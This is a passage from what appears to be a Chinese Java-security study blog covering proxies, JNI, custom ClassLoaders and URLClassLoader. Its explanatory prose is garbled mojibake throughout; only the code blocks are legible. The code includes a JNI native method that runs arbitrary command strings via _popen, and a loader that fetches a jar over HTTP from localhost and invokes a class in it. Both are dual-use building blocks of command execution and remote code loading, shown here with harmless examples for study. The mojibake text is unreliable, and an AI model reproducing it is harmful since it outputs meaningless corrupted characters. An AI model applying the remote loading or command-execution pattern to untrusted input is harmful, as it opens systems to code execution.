æ¥è¯´æ˜ä¸€ä¸‹å§ã€‚</p><p>ä»¥åˆšåˆšçš„è¾“å‡ºhelloworldçš„ç±»ä¸ºä¾‹ã€‚æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªå®ƒçš„å­ç±»ï¼Œå¹¶åœ¨å…¶ä¸­é‡å†™å…¶gogoæ–¹æ³•ï¼Œæ·»åŠ æ—¥å¿—ç”ŸæˆåŠŸèƒ½</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class hello&#123;</span><br><span class="line">    public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class static_hello_proxy extends hello&#123;</span><br><span class="line">    hello hello_obj;</span><br><span class="line">    static_hello_proxy(hello hello)&#123;</span><br><span class="line">        this.hello_obj &#x3D; hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void gogo()&#123;</span><br><span class="line">        log();</span><br><span class="line">        hello_obj.gogo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void log()&#123;</span><br><span class="line">        Date date &#x3D; new Date();</span><br><span class="line">        String value &#x3D; &quot;date:&quot;+date+&quot;\n&quot;;</span><br><span class="line">        FileWriter writer &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            writer &#x3D; new FileWriter(new File(&quot;log.txt&quot;),true);</span><br><span class="line">            writer.write(value);</span><br><span class="line">            writer.flush();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä¸»å‡½æ•°ä¸­æˆ‘ä»¬åªéœ€è°ƒç”¨static_hello_proxyä¸­çš„gogo()æ–¹æ³•å°±èƒ½è¾¾åˆ°æ—¥å¿—åŠŸèƒ½äº†ã€‚è¿™å°±æ˜¯é™æ€ä»£ç†ã€‚<br>é™æ€ä»£ç†çš„ç¼ºç‚¹æ˜¾è€Œæ˜“è§ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä»£ç†ä¸åŒçš„ç±»ï¼Œå°±è¦å†™å‡ºä¸åŒçš„é™æ€ä»£ç†ç±»å‡ºæ¥ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯èƒ½ä¼šé‡åˆ°éœ€è¦å¤šä¸ªä»£ç†ç±»æ¥å¢æ·»å®ç°ä¸€ä¸ªç±»çš„ä¸åŒåŠŸèƒ½ï¼Œæœ‰éœ€è¦å®šä¹‰ä¸€å¤§å †ç±»å‡ºæ¥ã€‚ä¸å®¹æ˜“ç»´æŠ¤ï¼Œæ‰€ä»¥åŠ¨æ€ä»£ç†å°±è¯ç”Ÿäº†ï¼Œå®ƒå¾ˆå¥½çš„è§£å†³äº†é™æ€ä»£ç†ä¼šäº§ç”Ÿå¤§é‡ä»£ç†ç±»çš„éš¾é¢˜ã€‚</p><h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><p>ä½¿ç”¨åŠ¨æ€ä»£ç†ï¼Œå¯ä»¥ä¸ç”¨åˆ›å»ºä»£ç†ç±»ï¼Œéå¸¸çš„æ–¹ä¾¿ã€‚</p><p>åŠ¨æ€ä»£ç†ç”±Proxy.newProxyInstanceæ–¹æ³•å®ç°ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150752.png" alt="QQæˆªå›¾20210219150752"></p><p>æˆ‘ä»¬çœ‹çœ‹å®ƒçš„ä¸‰ä¸ªå‚æ•°ã€‚<br>loaderï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯è¢«ä»£ç†ç±»çš„ç±»åŠ è½½å™¨ã€‚<br>interfaces è¢«ä»£ç†ç±»æ‰€éœ€è¦å®ç°çš„æ¥å£ï¼Œå¯é€šè¿‡ ç±»å¯¹è±¡.getinterfaces()è·å¾—<br>h å³ InvocationHandleræ¥å£ç±» çš„å®ç°ç±»ï¼Œç”¨äºå®ç°ä»£ç†å¢æ·»çš„æ–¹æ³•</p><p>æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ª InvocationHandler ç±»çš„ç»“æ„ã€‚è¿™ä¸ªç±»åªæœ‰ä¸€ä¸ªinvokeæ–¹æ³•ï¼Œä¸”è¿™ä¸ªç±»æ˜¯æ¥å£ç±»ã€‚è¿™ä¸ªinvokeæ–¹æ³•å°±ç”¨äºå­˜æ”¾æˆ‘ä»¬çš„å¢æ·»çš„åŠŸèƒ½ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150801.png" alt="QQæˆªå›¾20210219150801"></p><p>proxyå³ä»£ç†å¯¹è±¡ï¼Œmethodå³å¯¹è±¡ä¸­çš„æŸä¸ªæ–¹æ³•ï¼Œargså³æ–¹æ³•ä¸­çš„å‚æ•°ã€‚</p><p>okï¼Œæ¥ä¸‹æ¥æŠŠåˆšåˆšé‚£ä¸ªç±»åŠ¨æ€ä»£ç†ä¸€ä¸‹å§ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯åŠ¨æ€ä»£ç†åªèƒ½ä»£ç†æ¥å£å®ç°ç±»ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileWriter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        hello hello_obj &#x3D; new hello();</span><br><span class="line">        ClassLoader Loader &#x3D; hello_obj.getClass().getClassLoader();</span><br><span class="line">        Class&lt;?&gt;[] Interfaces &#x3D; hello_obj.getClass().getInterfaces();</span><br><span class="line">        InvocationHandler ih &#x3D; new InvocationHandler() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">                if(method.getName()&#x3D;&#x3D;&quot;gogo&quot;)&#123;</span><br><span class="line">                    FileWriter writer &#x3D; new FileWriter(&quot;log.txt&quot;);</span><br><span class="line">                    writer.write(&quot;date:&quot;+new Date()+&quot;|by åŠ¨æ€ä»£ç†\n&quot;);</span><br><span class="line">                    writer.flush();</span><br><span class="line">                    hello_obj.gogo();</span><br><span class="line">                &#125;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        hello_interface proxy &#x3D; (hello_interface) Proxy.newProxyInstance(Loader,Interfaces,ih);  &#x2F;&#x2F;æ³¨æ„è¿™é‡Œæ•°æ®ç±»å‹æ˜¯æ¥å£çš„æ•°æ®ç±»å‹</span><br><span class="line">        proxy.gogo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface hello_interface&#123;</span><br><span class="line">    public void gogo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class hello implements hello_interface&#123;</span><br><span class="line">    public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OK,ALL DOWN</p><h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><p>JNIæ˜¯JAVAçš„ä¸€ä¸ªæ¥å£ï¼Œç”¨æ¥å®ç°c/c++è°ƒç”¨ï¼Œä¸ºJAVAæä¾›äº†ä¸€ä¸ªæ“çºµåº•å±‚çš„èƒ½åŠ›ã€‚</p><h2 id="JNI-HelloWorld"><a href="#JNI-HelloWorld" class="headerlink" title="JNI HelloWorld"></a>JNI HelloWorld</h2><p>java IDEï¼šidea C IDEï¼švs2019</p><p>1.å†™å¥½JAVAæ–‡ä»¶ï¼Œå®šä¹‰å¥½nativeæ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        System.loadLibrary(&quot;Dll1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public native void hello();</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        test a &#x3D; new test();</span><br><span class="line">        a.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.ä½¿ç”¨javacæŒ‡ä»¤ä¸ºjavaæ–‡ä»¶çš„å„nativeæ–¹æ³•ç”Ÿæˆcè¯­è¨€å¤´æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac -cp . test.java -h .</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå¤´æ–‡ä»¶</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150831.png" alt="QQæˆªå›¾20210219150831"></p><p>3.ç”¨vscodeåˆ›å»ºä¸€ä¸ªdllé¡¹ç›®ï¼Œå°†test.hä¸jdk includeç›®å½•ä¸‹çš„jni.hä»¥åŠjdk/include/win32/jni_md.hç»Ÿç»Ÿç§»åŠ¨åˆ°é¡¹ç›®æ–‡ä»¶ç›®å½•ä¸‹ã€‚ç„¶ååœ¨vscodeå¤´æ–‡ä»¶é‡Œæ·»åŠ ç°æœ‰é¡¹ï¼ŒæŠŠåˆšåˆšæ”¾åˆ°é¡¹ç›®æ–‡ä»¶ä¸‹çš„3ä¸ªå¤´æ–‡ä»¶æ·»åŠ è¿›å»ã€‚</p><p>4.åœ¨cæˆ–c++ä¸­å®šä¹‰nativeæ–¹æ³•çš„c/c++åŸå‹ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150842.png" alt="QQæˆªå›¾20210219150842"></p><p>é€šè¿‡test.hæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“ªäº›æ–¹æ³•éœ€è¦æˆ‘ä»¬å®šä¹‰ã€‚è¿™é‡Œæ˜¯Java_test_helloæ–¹æ³•ã€‚</p><p>æˆ‘ä»¬éšä¾¿å®šä¹‰ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;test.h&quot;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL Java_test_hello(JNIEnv* a, jobject b) &#123;</span><br><span class="line">printf(&quot;Hello,World&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸ºdllæ–‡ä»¶ã€‚</p><p>5.åœ¨ideaé‡Œä¸ºå½“å‰é¡¹ç›®æŒ‡å®šä¾èµ–dllæ–‡ä»¶è·¯å¾„</p><p>å…ˆç‚¹å‡»ç®­å¤´æŒ‡å‘å¤„çš„ç¼–è¾‘é€‰é¡¹ï¼Œç„¶ååœ¨è™šæ‹Ÿæœºé€‰é¡¹é‡Œå¡«ä¸Š-Djava.library.path=ä½ çš„dllè·¯å¾„</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151203.png" alt="QQæˆªå›¾20210219151203"></p><p>6.æŠŠdllæ–‡ä»¶æ‹–è¿›åˆšåˆšé…ç½®å¥½çš„ä¾èµ–è·¯å¾„ï¼Œè¿è¡Œ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151203.png" alt="QQæˆªå›¾20210219151203"></p><h2 id="JNI-æ•°æ®ç±»å‹"><a href="#JNI-æ•°æ®ç±»å‹" class="headerlink" title="JNI æ•°æ®ç±»å‹"></a>JNI æ•°æ®ç±»å‹</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151238.png" alt="QQæˆªå›¾20210219151238"></p><p>JNIç±»å‹æ•°æ®åœ¨cæ–‡ä»¶é‡Œå½“ä½œä¼ å…¥å‚æ•°å’Œè¿”å›ç»“æœï¼Œå‚æ•°ä¼ å…¥åå…¶æ•°æ®ç±»å‹ä¼šè¢«ç”¨æŒ‡å®šæ–¹æ³•è½¬æ¢ä¸ºCç±»å‹ç„¶åè¢«å¤„ç†ï¼Œå¤„ç†å®Œæ¯•åä½¿ç”¨æŒ‡å®šæ–¹æ³•è½¬æ¢ä¸ºJNIç±»å‹è¿”å›ç»™JAVAã€‚</p><p>è¿™é‡Œä»‹ç»ä¸€ä¸‹cä¸­JNIç±»å‹ä¸cç±»å‹äº’è½¬çš„å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jstringè½¬char*ï¼šenv-&gt;GetStringUTFChars(str, &amp;jsCopy)</span><br><span class="line"></span><br><span class="line">char*è½¬jstring: env-&gt;NewStringUTF(&quot;Hello...&quot;)</span><br><span class="line"></span><br><span class="line">å­—ç¬¦ä¸²èµ„æºé‡Šæ”¾: env-&gt;ReleaseStringUTFChars(javaString, p);</span><br></pre></td></tr></table></figure><h2 id="JNI-å®ç°æœ¬åœ°å‘½ä»¤æ‰§è¡Œ"><a href="#JNI-å®ç°æœ¬åœ°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="JNI å®ç°æœ¬åœ°å‘½ä»¤æ‰§è¡Œ"></a>JNI å®ç°æœ¬åœ°å‘½ä»¤æ‰§è¡Œ</h2><p>ç›¸å½“äºä¸€ä¸ªåŠ å¼ºç‰ˆçš„helloworld.</p><p>é¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼Œå¦‚æœåœ¨c++ä¸­æˆ‘ä»¬æƒ³æ‰§è¡Œæœ¬åœ°å‘½ä»¤æ‰§è¡Œè¯¥å¦‚ä½•æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">std::string gogo(const char* cmd) &#123;</span><br><span class="line">const char* cmd &#x3D; cmd;</span><br><span class="line">FILE* fp &#x3D; _popen(cmd, &quot;r&quot;);</span><br><span class="line">if (fp !&#x3D; NULL) &#123;</span><br><span class="line">std::string result;</span><br><span class="line">char buf[128];</span><br><span class="line">while (fgets(buf, sizeof(buf), fp) !&#x3D; NULL) &#123;</span><br><span class="line">result +&#x3D; buf;</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">std::string result &#x3D; gogo(&quot;dir&quot;);</span><br><span class="line">std::cout &lt;&lt; result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨JNIé‡Œå¦‚ä½•å®ç°å‘¢?å…¶å®ä¹Ÿå·®ä¸å¤š.</p><p>æˆ‘ä»¬ç°åœ¨å†™å¥½javaä»£ç </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        System.loadLibrary(&quot;Dll2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public native String gogo(String cmd);</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        test a &#x3D; new test();</span><br><span class="line">        String str &#x3D; a.gogo(&quot;dir&quot;);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™å¥½c++ä»£ç </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;test.h&quot;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">JNIEXPORT jstring JNICALL Java_test_gogo(JNIEnv* env, jobject obj, jstring str) &#123;</span><br><span class="line"> const char* cmd &#x3D; env-&gt;GetStringUTFChars(str, 0);</span><br><span class="line"> FILE* fd &#x3D; _popen(cmd, &quot;r&quot;);</span><br><span class="line"> if (fd !&#x3D; NULL) &#123;</span><br><span class="line"> std::string result;</span><br><span class="line"> char buf[128];</span><br><span class="line"> while (fgets(buf, sizeof(buf), fd) !&#x3D; NULL) &#123;</span><br><span class="line"> result +&#x3D; buf;</span><br><span class="line"> &#125;</span><br><span class="line"> _pclose(fd);</span><br><span class="line"> return env-&gt;NewStringUTF(result.c_str());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151248.png" alt="QQæˆªå›¾20210219151248"></p><h1 id="ç±»åŠ è½½å™¨"><a href="#ç±»åŠ è½½å™¨" class="headerlink" title="ç±»åŠ è½½å™¨"></a>ç±»åŠ è½½å™¨</h1><h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>åœ¨JVMç±»åŠ è½½å™¨ä¸­æœ€é¡¶å±‚çš„æ˜¯<code>Bootstrap ClassLoader(å¼•å¯¼ç±»åŠ è½½å™¨)</code>ã€<code>Extension ClassLoader(æ‰©å±•ç±»åŠ è½½å™¨)</code>ã€<code>App ClassLoader(ç³»ç»Ÿç±»åŠ è½½å™¨)</code>ï¼Œ<code>AppClassLoader</code>æ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¦‚æœç±»åŠ è½½æ—¶æˆ‘ä»¬ä¸æŒ‡å®šç±»åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨<code>AppClassLoader</code>åŠ è½½ç±»ï¼Œ<code>ClassLoader.getSystemClassLoader()</code>è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ä¹Ÿæ˜¯<code>AppClassLoader</code>ã€‚</p><p>ClassLoaderçš„ä¸»è¦æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ol><li><code>loadClass</code>(åŠ è½½æŒ‡å®šçš„Javaç±»)</li><li><code>findClass</code>(æŸ¥æ‰¾æŒ‡å®šçš„Javaç±»)</li><li><code>findLoadedClass</code>(æŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»)</li><li><code>defineClass</code>(ä»byte[]è·å¾—ä¸€ä¸ªJavaç±»)</li><li><code>resolveClass</code>(é“¾æ¥æŒ‡å®šçš„Javaç±»)</li></ol><p>å¦‚ä½•é€šè¿‡ClassLoaderè·å–ä¸€ä¸ªç±»å¯¹è±¡ï¼Ÿå¾ˆç®€å•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class a &#x3D; ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</span><br></pre></td></tr></table></figure><p>å®ƒå¯¹ä¸€ä¸ªç±»çš„åŠ è½½æµç¨‹å¦‚ä¸‹:</p><ol><li>ClassLoaderè°ƒç”¨loadClass(String name)æ–¹æ³•åŠ è½½æŒ‡å®šç±»</li><li>è°ƒç”¨findLoadedClassæ£€æŸ¥æŒ‡å®šçš„ç±»æ˜¯å¦å·²ç»åˆå§‹åŒ–ï¼Œè‹¥å·²åˆå§‹åŒ–åˆ™ç›´æ¥è¿”å›ç±»å¯¹è±¡</li><li>å¦‚æœåˆ›å»ºClassLoaderæ—¶ä¼ å…¥çˆ¶ç±»åŠ è½½å™¨ï¼Œåˆ™ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨åŠ è½½æŒ‡å®šç±»ï¼Œå¦åˆ™ä½¿ç”¨JVMçš„Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰åŠ è½½</li><li>å¦‚æœä»¥ä¸Šæ­¥éª¤æ²¡æœ‰å®ŒæˆåŠ è½½ï¼Œåˆ™ä½¿ç”¨findClassæ–¹æ³•å°è¯•åŠ è½½æŒ‡å®šç±»</li><li>å¦‚æœå½“å‰ClassLoaderç±»æ²¡æœ‰é‡å†™findClassæ–¹æ³•åˆ™ç›´æ¥è¿”å›å¼‚å¸¸ã€‚è‹¥é‡å†™äº†è¯¥æ–¹æ³•ä¸”é€šè¿‡findClassæ‰¾åˆ°äº†ä¼ å…¥çš„ç±»åçš„å¯¹åº”çš„ç±»å­—èŠ‚ç ï¼Œé‚£ä¹ˆå°±ä¼šä½¿ç”¨defineClasså»JVMæ³¨å†Œè¯¥ç±»</li><li>å¦‚æœloadClassè°ƒç”¨æ—¶ä¼ å…¥resolveçš„å‚æ•°ä¸ºtrueï¼Œåˆ™é‚£ä¹ˆè¿˜éœ€è¦è°ƒç”¨resolveClassæ–¹æ³•è¿æ¥ç±»ã€‚è¯¥å‚æ•°é»˜è®¤ä¸ºfalse</li><li>è¿”å›è¢«JVMåŠ è½½åçš„æŒ‡å®šç±»çš„ç±»å¯¹è±¡</li></ol><h2 id="ClassLoaderè‡ªå®šä¹‰"><a href="#ClassLoaderè‡ªå®šä¹‰" class="headerlink" title="ClassLoaderè‡ªå®šä¹‰"></a>ClassLoaderè‡ªå®šä¹‰</h2><p>java.lang.ClassLoader æ˜¯æ‰€æœ‰ç±»åŠ è½½å™¨çš„çˆ¶ç±»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡å†™å…¶findClassæ–¹æ³•æ¥å®ç°è‡ªå®šä¹‰ClassLoaderã€‚</p><p>æˆ‘ä»¬è¯•ç€è‡ªå®šä¹‰ä¸€ä¸ªï¼Œå½“å¯¹loadClassä¼ å…¥com.anbai.sec.classloader.TestHelloWorld æ—¶ä¼šç›´æ¥è¿”å›ä¸€ä¸ªåœ¨åŠ è½½å™¨é‡Œå·²ç»å®šä¹‰å¥½äº†çš„å¯¹åº”ç±»çš„ç±»å¯¹è±¡ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class TestClassLoader extends  ClassLoader&#123;</span><br><span class="line">    String testClassName&#x3D;&quot;com.anbai.sec.classloader.TestHelloWorld&quot;;</span><br><span class="line">    byte[] testClassBytes &#x3D; new byte[]&#123;-54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,</span><br><span class="line">            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,</span><br><span class="line">            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,</span><br><span class="line">            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,</span><br><span class="line">            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,</span><br><span class="line">            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,</span><br><span class="line">            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,</span><br><span class="line">            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,</span><br><span class="line">            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,</span><br><span class="line">            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,</span><br><span class="line">            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,</span><br><span class="line">            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,</span><br><span class="line">            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,</span><br><span class="line">            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,</span><br><span class="line">            0, 0, 0, 2, 0, 12&#125;;  &#x2F;&#x2F;è¿™éƒ¨åˆ†æ˜¯ç±»å­—èŠ‚ç ï¼Œæ˜¯æˆ‘ä»åˆ«äººé‚£é‡Œå«–çš„</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        if(name.equals(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;))&#123;</span><br><span class="line">            return  defineClass(testClassName,testClassBytes,0,testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            return super.findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä¸»å‡½æ•°æˆ‘ä»¬å†™</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        TestClassLoader Loader &#x3D; new TestClassLoader();</span><br><span class="line">        Class clazz &#x3D; Loader.loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);</span><br><span class="line">        Object Instance &#x3D; clazz.newInstance();</span><br><span class="line">        Method method &#x3D; Instance.getClass().getMethod(&quot;hello&quot;);</span><br><span class="line">        String str &#x3D; (String) method.invoke(Instance);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;catch (Exception e)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»æµ‹è¯•ç¨‹åºæ­£å¸¸è¿è¡Œã€‚æˆ‘ä»¬çš„è‡ªå®šä¹‰ClassLoaderå°±å†™å¥½äº†ã€‚å½“ç„¶è¿˜æœ‰æ›´å¤šèŠ±é‡Œèƒ¡å“¨çš„é‡å†™æ–¹æ³•ï¼Œæˆ‘ä»¬è¿™é‡Œåªæ˜¯çŸ¥é“æ€ä¹ˆé‡å†™å³å¯ã€‚</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>URLClassLoaderä¹Ÿæ˜¯ClassLoaderç±»ä¸‹çš„ä¸€ä¸ªé‡å†™ç±»ã€‚è¿™ä¸ªç±»å¾ˆå¥½ç”¨ï¼Œå®ƒå¯ä»¥é€šè¿‡ç½‘ç»œåè®®è·å–è¿œç¨‹çš„jaråŒ…ï¼Œç„¶åé€šè¿‡ç±»åŠ è½½å™¨å»è·å¾—å…¶ä¸­çš„æŒ‡å®šç±»çš„ç±»å¯¹è±¡ã€‚è¯•è¯•å§ã€‚</p><p>æµç¨‹æ˜¯å…ˆå®šä¹‰ä¸€ä¸ªURLå¯¹è±¡æŒ‡å‘æˆ‘ä»¬çš„jaråŒ…ï¼Œç„¶åå®ä¾‹åŒ–ä¸€ä¸ªURLClassLoaderå¯¹è±¡ï¼Œç„¶åé€šè¿‡loadClassåŠ è½½æŸä¸ªç±»è·å¾—ç±»å¯¹è±¡ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">&#x2F;&#x2F;                Class clazz &#x3D; ClassLoader.getSystemClassLoader().loadClass(&quot;fuck&quot;);</span><br><span class="line">&#x2F;&#x2F;                Method method &#x3D; clazz.getMethod(&quot;func1&quot;,int.class);</span><br><span class="line">&#x2F;&#x2F;                method.invoke(clazz.newInstance(),123);</span><br><span class="line">                URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;LOL.jar&quot;);</span><br><span class="line">                URLClassLoader Loader &#x3D; new URLClassLoader(new URL[]&#123;url&#125;);</span><br><span class="line">                Class clazz &#x3D; Loader.loadClass(&quot;fuck&quot;);</span><br><span class="line">                Method method &#x3D; clazz.getMethod(&quot;func1&quot;,int.class);</span><br><span class="line">                method.setAccessible(true);</span><br><span class="line">                method.invoke(clazz.newInstance(),123);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬jaråŒ…é‡Œçš„classæ˜¯è¿™ä¸ª.JAVAçš„ç¼–è¯‘æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class fuck&#123;</span><br><span class="line">    public void func1(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span 